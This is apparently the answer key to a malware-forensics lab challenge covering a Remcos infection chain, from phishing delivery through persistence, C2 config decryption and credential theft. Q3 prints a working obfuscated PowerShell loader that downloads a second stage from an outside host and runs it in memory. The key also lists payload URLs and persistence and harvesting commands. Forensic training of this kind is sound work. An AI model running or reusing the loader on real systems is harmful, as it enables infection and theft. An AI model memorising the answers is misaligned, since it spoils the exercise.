@@ -1,0 +1,121 @@
+Germany Lab
+Formal Questions and Answers
+
+This document records the validated answers for the Germany lab challenge in a clear and formal question-and-answer format.
+
+Q1. What is the MITRE ATT&CK ID for the delivery of the malicious file?
+Answer: T1566.001
+
+Q2. What is the MD5 hash of the malicious file?
+Answer: 5797120155f72b86920a708ab2ec607c
+
+Q3. What is the full reconstructed command string?
+Answer: powershell -NoProfile -WindowStyle Hidden -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JEJ0cmZ3ID0gJigiezJ9ezB9ezF9IiAtZidlVy0nLCdvYmplQ3QnLCdOJykgc3lTVGVNLm5FVC5XZUJDbEllTnQ7DQokYnRSZlcuaEVhREVycy5BZGQoKCJ7Mn17MH17MX0iLWYgJ2cnLCdlbnQnLCdVc2VyLUEnKSwgKCgiezIwfXsxN317MTR9ezl9ezEwfXsxOX17Mn17N317MH17MjZ9ezE2fXszfXs4fXsxNX17MTJ9ezIzfXsxMX17Nn17MjF9ezEzfXsyMn17NH17MX17MjV9ezE4fXs1fXsyNH0iLWYnNDsgeDYnLCcuOScsJ1dpbicsJyBBcHAnLCc2MScsJ2ZhcmkvNTMnLCcgR2Vja28pIENocm9tZScsJzYnLCdsZVdlYktpdC81JywnbicsJ2Rvd3MgTlQgMTAnLCdrZScsJ0tIVE0nLCcyMicsJy81LjAgKFdpJywnMzcuMzYgKCcsJyknLCdpbGxhJywnU2EnLCcuMDsgJywnTW96JywnLzEnLCcuMC42MicsJ0wsIGxpJywnNy4zNicsJzUgJywnNCcpKSk7DQokQlRSZlcuaEVhRGVSUy5BZEQoKCJ7MH17MX0iLWYgJ0FjY2UnLCdwdCcpLCAoInsxN317OH17M317MTF9ezB9ezE2fXsyfXsxM317NX17MTJ9ezd9ezE1fXsxNH17MTh9ezF9ezR9ezl9ezEwfXs2fSItZidhcHBsaWMnLCduL3htbDsnLCd0aScsJy9odCcsJ3EnLCdodG1sJywnOSwqLyo7cT0wLjgnLCdtbCcsJ2V4dCcsJz0wJywnLicsJ21sLCcsJyt4Jywnb24veCcsJ2FwcGxpJywnLCcsJ2EnLCd0JywnY2F0aW8nKSk7DQokQnRSZlcuaEVhZEVSUy5hREQoKCJ7Mn17NX17NH17Nn17MX17MH17M30iLWYnbmd1YWc8JywnYScsJ0FjJywnIyAgIz5lJywncHQtJywnY2UnLCdMJyksICgiezB9ezJ9ezN9ezF9ezR9Ii1mJ2VuLVUnLCc7cT0wJywnUyxlJywnbicsJy45JykpOw0KW1NUcmluZ100OTggfCAuKCJ7MX17MH0iLWYnLU51TEwnLCdvVXQnKQ0KDQokT3B3dCA9ICgiezF9ezV9ezN9ezZ9ezB9ezR9ezJ9Ii1mJzM1JywnaHR0cDovL2FyY2h2ZScsJ25nJywnb3JnL01TSV9QUk9fMjAyODEnLCcucCcsJy4nLCcxJyk7DQokV1FnTiA9ICRidFJGdy5Eb1dubE9BRGRhdGEoJG9Qd3QpOw0KDQokbGVYa1JpdDggPSBbU1lTVGVtLnRleFQuRW5jT0RJbmddOjphc2NpSS5nRXRTdFJpTkcoJHdxZ24pOw0KaWYgKCRMRVhLcmlUOCAtbWF0Y2ggKCJ7M317Mn17Nn17MH17NX17NH17MX17N30iIC1mJyonLCdzZUUnLCdhc2VTdGFydC0oJywnQicsJy1CYScsJz8pJywnLicsJ25kJykpIHsNCiAgICAkVnFsbjN6ID0gJE1hVENoZVNbMV07DQogICAgJHpLOW4gPSBbc3lTdEVNLlJlZkxFQ3RJb04uQXNzZW1ibHldOjpMT2FEKFtjb25WRXJ0XTo6RlJvbUJBc2U2NHNUUkluRygkVnFsTjNaKSk7DQogICAgW2NsYVNTbGlCUmFyeTEuY0xhU3MxXTo6VkFpKCgiezZ9ezJ9ezd9ezB9ezF9ezR9ezV9ezh9ezl9ezEwfXszfSIgLWYgJ1knLCdqTTFFVE15QWpNZicsJzVVeicsJ21MalZHZDFOMkx2b0RjMFJIYScsJzltJywnZHBWWCcsJzBoSGR1QVROJywnTncnLCdjeUYyJywnTGhwbkwnLCd2TicpLCIxIiwoKCgiezB9ezR9ezN9ezF9ezV9ezJ9ezd9ezZ9Ii1mICdDOnsnLCcwJywnRG93bmxvYWQnLCd7JywnMH1Vc2Vyc3swfVB1YmxpYycsJ30nLCcwfScsJ3N7JykpIC1mIFtjaGFyXTkyKSwoInsxfXsyfXswfSItZicybTlMJywnSzcnLCd2WCcpLCIiLCIiLCgiezF9ezB9ezJ9Ii1mJzRqTicsJ0QnLCc2cDFSJyksImpzIiwiMCIsKCJ7MX17MH0iIC1mJ2xzZScsJ2ZhJyksKCJ7M317MX17MH17Mn0iLWYgJ3BsYXknLCdpcycsJ2FibGUnLCdkJyksIiIsKCJ7MX17MH0iIC1mICd1ZScsJ3RyJyksIiIsIiIsIiIsICIiLCAiIiwgIiIpOw0KfSBlbHNlIHsNCiAgICBFeGl0DQp9')) | Invoke-Expression
+
+Q4. Identify the specific Windows Management Instrumentation (WMI) namespace string used by the script to interface with the system management layer and execute the payload.
+Answer: winmgmts:root\cimv2
+
+Q5. What is the URL of the second-stage?
+Answer: http://archve.org/MSI_PRO_20281135.png
+
+Q6. What is the MD5 hash of the second-stage?
+Answer: 569e616d712de880288c6197c01539bd
+
+Q7. What is the MD5 hash of the extracted payload?
+Answer: e9c3acfd36278fb891d4f44c15a68bb2
+
+Q8. Identifying the legitimate origin of the extracted payload: what is the GitHub repository URL associated with this library?
+Answer: https://github.com/dahall/TaskScheduler
+
+Q9. What is the MITRE ATT&CK technique used for loading the payload?
+Answer: T1620
+
+Q10. What is the name of the function invoked by the loader?
+Answer: VAi
+
+Q11. What is the full Registry key path for persistence?
+Answer: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+
+Q12. What is the Registry value name for persistence?
+Answer: displayable
+
+Q13. What is the command string stored in the Registry value?
+Answer: wscript.exe //b "C:\Users\Public\Downloads\K7vX2m9L.js"
+
+Q14. Which anti-VM techniques are implemented in the loader?
+Answer:
+- Querying BIOS and System Manufacturer information
+- Checking for hardware resource limitations
+- Verifying the presence of specific registry keys and ACPI tables
+
+Q15. What is the final payload download URL?
+Answer: http://cutec.co.za/arquivo_20211526075950.txt
+
+Q16. Once the final payload is downloaded, what is the full file system path where it is stored on the infected host?
+Answer: C:\Users\Administrator\AppData\Local\Temp\D4jN6p1R.exe
+
+Q17. What is the MD5 hash of the final Remcos payload?
+Answer: db9adcb66be33e264f7cbaeda8d2c3f9
+
+Q18. What is the Type and Name of the resource where the C2 configuration is stored? (Format: TYPE:NAME)
+Answer: RCDATA:SETTINGS
+
+Q19. Which algorithm is used to encrypt the configuration?
+Answer: RC4
+
+Q20. What is the decryption key in hex?
+Answer: 1df356165637c3b6064086180f2d55d8
+
+Q21. What are the magic bytes that represent the Remcos signature?
+Answer: 2404ff00
+
+Q22. What is this exact hex sequence used as delimiter?
+Answer: 7c1e1e1f7c
+
+Q23. What is the exact Mutex string name used by this bot instance to identify its active instance?
+Answer: Global\Rmc-ID3RBF
+
+Q24. What is the MITRE ATT&CK technique ID for the specific type of Process Injection used by the watchdog?
+Answer: T1055.012
+
+Q25. What is the full file path where the watchdog process is injected?
+Answer: C:\Windows\System32\fsutil.exe
+
+Q26. What is the amount of time (in seconds) that the malware remains silent before initiating C2 communication?
+Answer: 7
+
+Q27. What is the full "Hex:Command" pattern sent for the first execution involving the Windows CLI utility?
+Answer: 0e:netstat -ano
+
+Q28. Question and validated answer were not supplied in the provided lab notes.
+Answer: Not provided in source material.
+
+Q29. What is the full file system path of the exfiltrated file?
+Answer: C:\Users\Administrator\AppData\Roaming\Screenshots\time_20260326_161322.bmp
+
+Q30. What is the MD5 hash of the exfiltrated file?
+Answer: 9ba02a9132294d54bd7f137175c14a7b
+
+Q31. What is the real name of the third-party binary module executed for credential harvesting?
+Answer: WebBrowserPassView.exe
+
+Q32. What is the full command executed by the malware to steal passwords?
+Answer: "C:\Users\Administrator\AppData\Local\Temp\frAQBc.exe" /stext "C:\Users\Administrator\AppData\Local\Temp\frAQBc.txt"
+
+Q33. What are the specific credentials stolen by the malware during its harvesting phase? (email:password)
+Answer: cicamo3022@muncloud.com:p@ssw0rd9753
+
+Q34. The attacker also utilized an online keylogger during the session. What specific string was captured?
+Answer: secdojo[SHIFT]@9628
+
+Q35. What is the URL of the external API used by the malware to identify its geographical location?
+Answer: http://geoplugin.net/json.gp
+
+Q36. What is the Windows API function called when the attacker sends command 0x26?
+Answer: MessageBoxA
+
+Q37. What is the raw string sent by the attacker when using command 0x26?
+Answer: Secdojo|you have been hacked
+
+Q38. What is the full command executed to achieve self-deletion and cleanup?
+Answer: wscript.exe "C:\Users\ADMINI~1\AppData\Local\Temp\8Wsa1xVPfv.vbs"
